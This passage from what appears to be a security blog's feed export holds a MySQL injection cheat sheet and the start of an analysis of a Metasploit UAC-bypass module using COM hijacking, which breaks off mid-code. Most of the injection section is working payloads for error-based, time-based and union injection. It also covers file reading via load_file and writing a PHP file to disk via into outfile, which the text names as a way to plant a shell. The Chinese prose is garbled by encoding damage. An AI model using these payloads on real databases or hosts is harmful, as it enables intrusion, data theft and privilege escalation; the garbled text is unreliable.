class="line"><span class="keyword">SELECT</span> username <span class="keyword">FROM</span> <span class="keyword">user</span>  <span class="keyword">LIMIT</span> <span class="number">1</span>,<span class="number">3</span> <span class="keyword">procedure</span> analyse(extractvalue(<span class="keyword">rand</span>(),<span class="keyword">concat</span>(<span class="number">0x3a</span>,<span class="keyword">version</span>())),<span class="number">1</span>);</span><br></pre></td></tr></table></figure></p><p><img src="/MySQL Injection.resources/2575E461-4D29-4818-9593-DCD0A35574D2.png" alt="c4033dbc4df97e555bdc39638d337f21"></p><p>Âõ†‰∏∫5.5ÁâàÊú¨‰∏çËÉΩ‰ΩøÁî®SELECTÔºåÊâÄ‰ª•Âè™ËÉΩËé∑Âèñ‰∏Ä‰∫õÈÖçÁΩÆ‰ø°ÊÅØÁ≠â</p><p><strong>exp</strong><br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> username <span class="keyword">FROM</span> <span class="keyword">user</span>  <span class="keyword">LIMIT</span> <span class="number">1</span>,<span class="number">3</span> <span class="keyword">procedure</span> analyse(extractvalue(<span class="keyword">rand</span>(),<span class="keyword">concat</span>(<span class="number">0x3a</span>,<span class="keyword">version</span>())),<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">field</span> <span class="keyword">FROM</span> <span class="keyword">table</span> <span class="keyword">WHERE</span> <span class="keyword">id</span> &gt; <span class="number">0</span> <span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="keyword">id</span> <span class="keyword">LIMIT</span> <span class="number">1</span>,<span class="number">1</span> <span class="keyword">PROCEDURE</span> analyse((<span class="keyword">select</span> extractvalue(<span class="keyword">rand</span>(),<span class="keyword">concat</span>(<span class="number">0x3a</span>,(<span class="keyword">IF</span>(<span class="keyword">MID</span>(<span class="keyword">version</span>(),<span class="number">1</span>,<span class="number">1</span>) <span class="keyword">LIKE</span> <span class="number">5</span>, <span class="keyword">BENCHMARK</span>(<span class="number">5000000</span>,<span class="keyword">SHA1</span>(<span class="number">1</span>)),<span class="number">1</span>))))),<span class="number">1</span>)</span><br></pre></td></tr></table></figure></p><h2 id="order-by"><a href="#order-by" class="headerlink" title="order by"></a>order by</h2><p>ÊµãËØïËØ≠Âè•Ôºö<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">user</span> <span class="keyword">order</span> <span class="keyword">by</span> uid &#123;evil&#125;;</span><br></pre></td></tr></table></figure></p><ol><li>Order by + Êä•ÈîôÊ≥®ÂÖ•<br><img src="/MySQL Injection.resources/68811865-6608-492B-9EA9-618492DCC0D1.png" alt="69d7117a4def2cf4d7d50d4c44b6ae03"></li></ol><ol start="2"><li><p>order by + Êó∂Èó¥Áõ≤Ê≥®<br><img src="/MySQL Injection.resources/7E50257D-D914-4605-B905-974ED4AFFDDC.png" alt="68c940c3c115e97f55fcc166249e6d0d"></p></li><li><p>order by + unionÊü•ËØ¢<br><img src="/MySQL Injection.resources/9D8482A7-0738-4C2C-B4F3-071B8CA50E97.png" alt="8635b1761c56ebe9d5b6204f5581517d"></p></li></ol><p>Ê≠§Ê≥®ÂÖ•ÂøÖÈ°ª‰ΩøÁî®()ÂåÖÂõ¥SQLËØ≠Âè•</p><ol start="4"><li>order by + regexp Áõ≤Ê≥®<br><img src="/MySQL Injection.resources/B5D21FEE-C714-4CD3-846F-CBDA2AF2129A.png" alt="27b6b63f4a93c01d5f57ee0a75c7efea"></li></ol><p>ËøôÈáåËß£Èáä‰∏Ä‰∏ãËØ≠Âè•<br>ÂΩìÊ≠£ÂàôÊú™ÂåπÈÖçÂà∞Êï∞ÊçÆÊó∂ÂÄôËøîÂõûÁöÑÁªìÊûúÊòØ0 ÊâÄ‰ª•SQLËØ≠Âè•Áõ∏ÂΩì‰∫é<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">order</span> <span class="keyword">by</span> uid ^ <span class="number">0</span>;</span><br></pre></td></tr></table></figure></p><p>ÊéíÂ∫è‰∏çÂèò<br><img src="/MySQL Injection.resources/38FFA41A-A8DA-4AE5-ACB7-FD4E5A91F294.png" alt="5a9b7d8ee50c22ed35efa6fb7e90310d"><br><strong>exp</strong><br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">user</span> <span class="keyword">ORDER</span> <span class="keyword">BY</span> uid <span class="keyword">and</span> extractvalue(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x3a</span>,<span class="keyword">user</span>()));</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">user</span> <span class="keyword">ORDER</span> <span class="keyword">BY</span> uid <span class="keyword">and</span> updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x3a</span>,<span class="keyword">user</span>()),<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">order</span> <span class="keyword">by</span> uid ^(<span class="keyword">select</span> (<span class="keyword">select</span> <span class="keyword">version</span>()) regexp <span class="string">'^aaaaaa'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">order</span> <span class="keyword">by</span> uid,(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">sleep</span>(<span class="number">3</span>))a);</span><br><span class="line"></span><br><span class="line">(<span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">order</span> <span class="keyword">by</span> uid) <span class="keyword">union</span> (<span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> <span class="keyword">version</span>()),<span class="number">3</span>,<span class="number">4</span>);</span><br></pre></td></tr></table></figure></p><h2 id="from"><a href="#from" class="headerlink" title="from"></a>from</h2><p>ÊµãËØïËØ≠Âè•<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> &#123;$<span class="keyword">Tables</span>&#125;;</span><br></pre></td></tr></table></figure></p><p>Áõ¥Êé•ÂµåÂ•óÂ≠êÊü•ËØ¢<br><img src="/MySQL Injection.resources/3356D524-EEEE-41BB-A7F6-EA9F38B99273.png" alt="37de6926a8a87e69f143bc5f7597342e"></p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>ÁâàÊú¨ÈôêÂà∂Ôºö Version &lt;= 5.5.5<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">exp</span>(~(<span class="keyword">select</span>*<span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())x));</span><br><span class="line"></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">users</span> (<span class="keyword">id</span>, username, <span class="keyword">password</span>) <span class="keyword">values</span> (<span class="number">2</span>, <span class="string">''</span> ^ <span class="keyword">exp</span>(~(<span class="keyword">select</span>*<span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())x)), <span class="string">'patrilic'</span>);</span><br></pre></td></tr></table></figure></p><h2 id="ExtractValue"><a href="#ExtractValue" class="headerlink" title="ExtractValue"></a>ExtractValue</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> uid = <span class="number">1</span> <span class="keyword">and</span> (extractvalue(<span class="string">'String'</span>,(<span class="keyword">select</span> <span class="keyword">user</span>())));</span><br></pre></td></tr></table></figure><blockquote><p>extractvalue(target fileÔºåxml path)</p></blockquote><p><img src="/MySQL Injection.resources/E0ADE9FD-0F0C-44E7-95D8-30330401643E.png" alt="53bb49c2016af886807088cd58c0709d"><br><img src="/MySQL Injection.resources/4D36E31A-C0BE-4B4C-9657-25BB4BC7E9DA.png" alt="0e204a12a24b48d87710e60dc9b7a104"></p><h2 id="UpdateXml"><a href="#UpdateXml" class="headerlink" title="UpdateXml"></a>UpdateXml</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> uid = <span class="number">1</span> <span class="keyword">and</span> (updatexml(<span class="string">'String'</span>,(<span class="keyword">Select</span> <span class="keyword">user</span>()),<span class="string">'String'</span>));</span><br></pre></td></tr></table></figure><blockquote><p>updatexml(Target fileÔºåxml pathÔºåupdateinfo)</p></blockquote><p><img src="/MySQL Injection.resources/B4AE3D11-4B7E-4285-BFE2-A8DF61A86FCA.png" alt="0786dc9cffd391c4dc9aec2cad9bb334"><br><img src="/MySQL Injection.resources/1AAFC23E-4228-4028-82AB-35DA8054C11A.png" alt="b6cbf8fdd04c44eeaa03b702c00ed273"></p><h2 id="name-const"><a href="#name-const" class="headerlink" title="name_const"></a>name_const</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> uid = <span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="keyword">name_const</span>(<span class="keyword">version</span>(),<span class="number">1</span>),<span class="keyword">name_const</span>(<span class="keyword">version</span>(),<span class="number">1</span>));</span><br></pre></td></tr></table></figure><p><img src="/MySQL Injection.resources/EA30D650-D0A6-4C03-A248-B3E78D259A1A.png" alt="a02097ebcc3c66a348903385c2e09abf"></p><blockquote><p>name_const(‚Äò1‚Äô, 14)<br>Â±ÄÈôêÊÄßÂæàÂ§ß</p></blockquote><h2 id="Êï¥Êï∞Ê∫¢Âá∫Êä•ÈîôÊ≥®ÂÖ•"><a href="#Êï¥Êï∞Ê∫¢Âá∫Êä•ÈîôÊ≥®ÂÖ•" class="headerlink" title="Êï¥Êï∞Ê∫¢Âá∫Êä•ÈîôÊ≥®ÂÖ•"></a>Êï¥Êï∞Ê∫¢Âá∫Êä•ÈîôÊ≥®ÂÖ•</h2><p>Áï•</p><h2 id="insert"><a href="#insert" class="headerlink" title="insert"></a>insert</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Insert</span> <span class="keyword">INTO</span> <span class="keyword">user</span> (uid,username,<span class="keyword">password</span>,city) <span class="keyword">VALUES</span> (?,?,?,?);</span><br></pre></td></tr></table></figure><p><img src="/MySQL Injection.resources/9C09B58A-2162-4FCF-8988-D8996342E899.png" alt="450be8fc5d042aa1d074506f7d5a93b7"></p><p><img src="/MySQL Injection.resources/4F1A02FF-2B06-4DC8-A883-D1B403287A29.png" alt="f87586d1fd2bcc77a06870c63fd14f28"></p><h2 id="delect"><a href="#delect" class="headerlink" title="delect"></a>delect</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DELETE</span> <span class="keyword">FROM</span> <span class="keyword">user</span> <span class="keyword">WHERE</span> uid=&#123;$uid&#125;;</span><br></pre></td></tr></table></figure><p><img src="/MySQL Injection.resources/C12A30AB-E4A6-4FF2-A383-08C1F7C0398E.png" alt="fdf530943ba24e6ec996a845e0b939cb"></p><h2 id="update"><a href="#update" class="headerlink" title="update"></a>update</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> <span class="keyword">user</span> <span class="keyword">SET</span> <span class="keyword">password</span> = &#123;$<span class="keyword">password</span>&#125; <span class="keyword">Where</span> username = &#123;session.user&#125; <span class="keyword">and</span> uid = &#123;session.uid&#125;</span><br></pre></td></tr></table></figure><p><img src="/MySQL Injection.resources/97D8B22C-8B27-4254-9E8B-C288DA88E4FD.png" alt="dcae7f06664c4456708cfdd3159490e9"><br><img src="/MySQL Injection.resources/AA3C9BAB-6ACC-44F4-9FCE-E770566EEFF6.png" alt="84d8c329a9ee3222c4c075648707d4e5"></p><h2 id="into-outfile"><a href="#into-outfile" class="headerlink" title="into outfile"></a>into outfile</h2><p>‰∏ªË¶ÅÁî®ÈÄîÔºöÂÜôshell<br>Ë¶ÅÊ±ÇÔºö</p><ul><li>Ë¶ÅÊ±ÇÁî®Êà∑ÂÖ∑ÊúâfileÊùÉÈôê</li><li>Êñá‰ª∂‰∏çËÉΩË¶ÜÁõñÂÜôÂÖ•ÔºåÊâÄ‰ª•Êñá‰ª∂ÂøÖÈ°ª‰∏∫‰∏çÂ≠òÂú®</li><li>Â¶ÇÊûúsecure_file_privÈùûÁ©∫ÔºåÂàôÂÜôÂÖ•Êñá‰ª∂ÁöÑÁõÆÂΩïÂè™ËÉΩ‰∏∫ÂØπÂ∫îÁõÆÂΩï‰∏ã<blockquote><p>into outfile + UNION</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">user</span> <span class="keyword">WHERE</span> uid = <span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">0x3c3f70687020706870696e666f28293b3f3e</span> <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">'Y:/123.php'</span>;</span><br></pre></td></tr></table></figure></blockquote></li></ul><p><img src="/MySQL Injection.resources/99802F7E-613B-4F25-8942-026AECDBE222.png" alt="bbeb09b67630a772e19b3b26e4f90b79"></p><blockquote><p>into outfile + LINES TERMINATED BY (limit)<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">order</span> <span class="keyword">by</span> uid <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span> <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">'Y:/123.php'</span> <span class="keyword">LINES</span> <span class="keyword">TERMINATED</span> <span class="keyword">BY</span> <span class="number">0x3c3f70687020706870696e666f28293b3f3e</span>;</span><br></pre></td></tr></table></figure></p></blockquote><p><img src="/MySQL Injection.resources/B0EEFE16-15A3-4E45-8DA7-616987B525AC.png" alt="0313b6aaee866dee9ee0cc785bc89e7b"></p><blockquote><p>into outfile + FIELDS TERMINATED BY (limit)<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">order</span> <span class="keyword">by</span> uid <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span> <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">'Y:/123.php'</span> <span class="keyword">fields</span> <span class="keyword">terminated</span> <span class="keyword">by</span>  <span class="number">0x3c3f70687020706870696e666f28293b3f3e</span>;</span><br></pre></td></tr></table></figure></p></blockquote><p><img src="/MySQL Injection.resources/2E99B9C7-7369-4853-9669-7C5D56934A8B.png" alt="922aaffeb4b239df59cf0ddbea8241a2"></p><blockquote><p>into outfile + LINES STARTING BY (limit)<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">order</span> <span class="keyword">by</span> uid <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span> <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">'Y:/123.php'</span> <span class="keyword">LINES</span> <span class="keyword">TERMINATED</span> <span class="keyword">BY</span> <span class="number">0x3c3f70687020706870696e666f28293b3f3e</span>;</span><br></pre></td></tr></table></figure></p></blockquote><p><img src="/MySQL Injection.resources/1DE8F60F-049E-4760-8B5A-6CB07714C781.png" alt="07ad0be0a19833ec877e9c7d77f0e0bc"></p><h2 id="load-file"><a href="#load-file" class="headerlink" title="load_file"></a>load_file</h2><p>‰∏ªË¶ÅÁî®ÈÄîÔºöËØªÊñá‰ª∂<br>Ë¶ÅÊ±ÇÔºö</p><ul><li>Ë¶ÅÊ±ÇÁî®Êà∑ÂÖ∑ÊúâfileÊùÉÈôê</li><li>Â¶ÇÊûúsecure_file_privÈùûÁ©∫ÔºåÂàôÂè™ËÉΩËØªÂèñÂØπÂ∫îÁõÆÂΩï‰∏ãÁöÑÊñá‰ª∂<blockquote><p>load_file + UNION</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> uid = <span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,(<span class="keyword">select</span> <span class="keyword">load_file</span>(<span class="string">'Y:/123.php'</span>));</span><br></pre></td></tr></table></figure></blockquote></li></ul><p><img src="/MySQL Injection.resources/72271A75-3061-4252-BE6A-8A25F2D836FF.png" alt="fda87515edd1a870031c33556799b653"></p><blockquote><p>load_file + updatexml<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span>  <span class="keyword">where</span> username = <span class="string">''</span> <span class="keyword">and</span> updatexml(<span class="number">0</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">LOAD_FILE</span>(<span class="string">'Y:/123.php'</span>)),<span class="number">0x7e</span>),<span class="number">0</span>);</span><br></pre></td></tr></table></figure></p></blockquote><p><img src="/MySQL Injection.resources/DDB31E30-84C6-4631-A40C-6A827C57AD55.png" alt="3b346d668d3dab3c2296330ac5421acd"></p><blockquote><p>load_file + extractive<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> uid=<span class="number">-1</span> <span class="keyword">and</span> (extractvalue(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span> (<span class="keyword">LOAD_FILE</span>(<span class="string">'Y:/1.php'</span>))),<span class="number">0x7e</span>)));</span><br></pre></td></tr></table></figure></p></blockquote><p><img src="/MySQL Injection.resources/4372D4EB-AC68-4E4B-9CD7-A7B7C0577854.png" alt="d068cdb2be5e81cf8ee618282fc0bb8f"></p><blockquote><p>load_file + isnull + updatexml<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span>  <span class="keyword">where</span> username = <span class="string">''</span> <span class="keyword">and</span> updatexml(<span class="number">0</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,<span class="keyword">isnull</span>(<span class="keyword">LOAD_FILE</span>(<span class="string">'D:/1.php'</span>)),<span class="number">0x7e</span>),<span class="number">0</span>);</span><br></pre></td></tr></table></figure></p></blockquote><p>Â≠òÂú®Êñá‰ª∂ ËøîÂõû0<br>‰∏çÂ≠òÂú®Êñá‰ª∂ ËøîÂõû1<br><img src="/MySQL Injection.resources/01D4A547-30E3-465F-A87C-0EA99176FBDF.png" alt="d54a32ed2b31fc6fb134d7275f17eae8"></p><h2 id="Dumpfile"><a href="#Dumpfile" class="headerlink" title="Dumpfile"></a>Dumpfile</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> _utf8<span class="string">'Hello world!'</span> <span class="keyword">INTO</span> <span class="keyword">DUMPFILE</span> <span class="string">'Y:/world.php'</span>;</span><br></pre></td></tr></table></figure><p><img src="/MySQL Injection.resources/9DCC84F2-4346-4F76-A753-2F7813A9DFE7.png" alt="c5c1ec183eb4aba323bedb95d56f2100"></p><h2 id="Case-When"><a href="#Case-When" class="headerlink" title="Case When"></a>Case When</h2><p><img src="/MySQL Injection.resources/QQ20190423-122637@2x.png" alt="QQ20190423-122637@2x.png"></p><h2 id="Pow"><a href="#Pow" class="headerlink" title="Pow"></a>Pow</h2><p><img src="/Á¨¨ÂçÅ‰∫åÂ±äÂÖ®ÂõΩÂ§ßÂ≠¶Áîü‰ø°ÊÅØÂÆâÂÖ®Á´ûËµõÂàùËµõWrite up.resources/55CC5315-17DB-49AC-BBF3-8B0316AA3933.png" alt="2cb4372b6213be745ecbf701adc81349.png"><br>ËøêÁÆóÁ¨¶‰ΩúÊù°‰ª∂Âà§Êñ≠ÔºåÂ¶ÇÊûúÈîôËØØÊï∞ÊçÆÂ∫ìÊä•ÈîôÔºöÂà©Áî®powÁöÑÊ∫¢Âá∫Âà§Êñ≠limit‰ΩçÊï∞ÁöÑascii</p><p><img src="/Á¨¨ÂçÅ‰∫åÂ±äÂÖ®ÂõΩÂ§ßÂ≠¶Áîü‰ø°ÊÅØÂÆâÂÖ®Á´ûËµõÂàùËµõWrite up.resources/DF663A7F-EB5F-41F6-9BFE-AE5A783CCF84.png" alt="f4abcef6f90ea02665adaf0f61d6ee7f.png"></p><h2 id="In"><a href="#In" class="headerlink" title="In"></a>In</h2><p><img src="/MySQL Injection.resources//QQ20190423-122422@2x.png" alt="QQ20190423-122422@2x.png"></p><h2 id="‰∏çÁü•ÈÅìÂàóÂêçÁöÑÊ≥®ÂÖ•"><a href="#‰∏çÁü•ÈÅìÂàóÂêçÁöÑÊ≥®ÂÖ•" class="headerlink" title="‰∏çÁü•ÈÅìÂàóÂêçÁöÑÊ≥®ÂÖ•"></a>‰∏çÁü•ÈÅìÂàóÂêçÁöÑÊ≥®ÂÖ•</h2><p>ÁúãÂéüÊñáÊØîËæÉÂ•ΩÔºåÁõ¥Êé•Â§çÁé∞‰∏Ä‰∏ã<br><img src="/MySQL Injection.resources/1359C87C-0FD0-4CEC-94C2-C7FD53622F20.png" alt="292940479295c820fe09ee52cc66aa61"><br><img src="/MySQL Injection.resources/C5353C73-C707-450C-AB0E-BC841DCDA2C9.png" alt="aa99b8908afbca3697612a580cf940eb"><br><img src="/MySQL Injection.resources/36489756-1393-404C-B72F-64E08CBF6877.png" alt="9dbf0195c2217b9ae5bc52ca52e89fd6"><br><img src="/MySQL Injection.resources/6B13EF6C-92F9-4238-9A6D-D6BBC9DB2A8A.png" alt="232655760d9f318c95d8c69b68f1827f"></p><h2 id="Thanks"><a href="#Thanks" class="headerlink" title="Thanks"></a>Thanks</h2><p><a href="https://www.lucifaer.com/2018/08/13/MySQLi%20Cookbook/" target="_blank" rel="noopener">MySQLi Cookbook</a><br><a href="https://www.cnblogs.com/lcamry/" target="_blank" rel="noopener">lcamry‚Äôs blog</a><br><a href="https://xz.aliyun.com/t/2460" target="_blank" rel="noopener">Êä•ÈîôÊ≥®ÂÖ•ÈÇÇÈÄÖload_file&amp;into outfileÊê≠ËÆ™LINES</a><br><a href="https://blog.redforce.io/sqli-extracting-data-without-knowing-columns-names/" target="_blank" rel="noopener">sqli-extracting-data-without-knowing-columns-name</a><br><a href="https://legacy.gitbook.com/book/wangyihang/sqli-labs/details" target="_blank" rel="noopener">wangyihang-sqli-labs-Script</a><br><a href="https://xz.aliyun.com/t/3992" target="_blank" rel="noopener">Âè≤‰∏äÊúÄÊ∞¥ÁöÑMYSQLÊ≥®ÂÖ•ÊÄªÁªì</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;[toc]&lt;/p&gt;
&lt;h2 id=&quot;Header&quot;&gt;&lt;a href=&quot;#Header&quot; class=&quot;headerlink&quot; title=&quot;Header&quot;&gt;&lt;/a&gt;Header&lt;/h2&gt;&lt;p&gt;ÊÄªÁªì‰∏ÄÊ≥¢MySQL‰∏ãÂêÑÂºèÂêÑÊ†∑Á≠âÊ≥®ÂÖ•ÊäÄÂ∑ßÔΩû&lt;br&gt;&lt;strong&gt;Test Mach
      
    
    </summary>
    
    
      <category term="SQLÊ≥®ÂÖ•" scheme="http://patrilic.top/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>bypassUAC_via_comhijacking</title>
    <link href="http://patrilic.top/2019/04/03/bypassUAC_via_comhijacking/"/>
    <id>http://patrilic.top/2019/04/03/bypassUAC_via_comhijacking/</id>
    <published>2019-04-03T05:12:49.000Z</published>
    <updated>2019-07-08T15:44:26.226Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-ComÂä´ÊåÅÂéüÁêÜ"><a href="#0x01-ComÂä´ÊåÅÂéüÁêÜ" class="headerlink" title="0x01 ComÂä´ÊåÅÂéüÁêÜ"></a>0x01 ComÂä´ÊåÅÂéüÁêÜ</h2><p>Âà©Áî®CLSIDÊêúÁ¥¢È°∫Â∫èÔºö</p><ol><li>HKCU\Software\Classes\CLSID</li><li>HKCR\CLSID</li><li>HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\ShellCompatibility\Objects\</li></ol><p>Â∞ÜË¢´Âä´ÊåÅÁöÑCLSIDÂ≠òÂÖ•ÔºöHKCU\Software\Classes\CLSID</p><p>CLSID ÁªìÊûÑ<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID   </span><br><span class="line"> &#123;CLSID&#125;       </span><br><span class="line">InprocServer32          (Default) = path          </span><br><span class="line">ThreadingModel     = value</span><br></pre></td></tr></table></figure></p><h2 id="0x02-uacbypass-comhijackÂàÜÊûê"><a href="#0x02-uacbypass-comhijackÂàÜÊûê" class="headerlink" title="0x02 uacbypass_comhijackÂàÜÊûê"></a>0x02 uacbypass_comhijackÂàÜÊûê</h2><p>Âà§Êñ≠Á≥ªÁªüÁâàÊú¨</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span></span></span><br><span class="line">    <span class="keyword">if</span> sysinfo[<span class="string">'OS'</span>] =~ <span class="regexp">/Windows (7|8|10|2008|2012|2016)/</span> &amp;&amp; is_uac_enabled? <span class="comment"># ‰ªémeterpreter‰∏≠Âà§Êñ≠OSÁâàÊú¨</span></span><br><span class="line">      Exploit::CheckCode::Appears</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      Exploit::CheckCode::Safe</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>Âä´ÊåÅÁÇπÔºöeventvwr.exe Âíå mmc.exe<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">@@hijack_points = [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="symbol">name:</span> <span class="string">'Event Viewer'</span>,</span><br><span class="line">      <span class="symbol">cmd_path:</span> <span class="string">'%WINDIR%\System32\eventvwr.exe'</span>,</span><br><span class="line">      <span class="symbol">class_ids:</span> [<span class="string">'0A29FF9E-7F9C-4437-8B11-F424491E3931'</span>]</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="symbol">name:</span> <span class="string">'Computer Managment'</span>,</span><br><span class="line">      <span class="symbol">cmd_path:</span> <span class="string">'%WINDIR%\System32\mmc.exe'</span>,</span><br><span class="line">      <span class="symbol">cmd_args:</span> <span class="string">'CompMgmt.msc'</span>,</span><br><span class="line">      <span class="symbol">class_ids:</span> [<span class="string">'0A29FF9E-7F9C-4437-8B11-F424491E3931'</span>]</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br></pre></td></tr></table></figure></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span 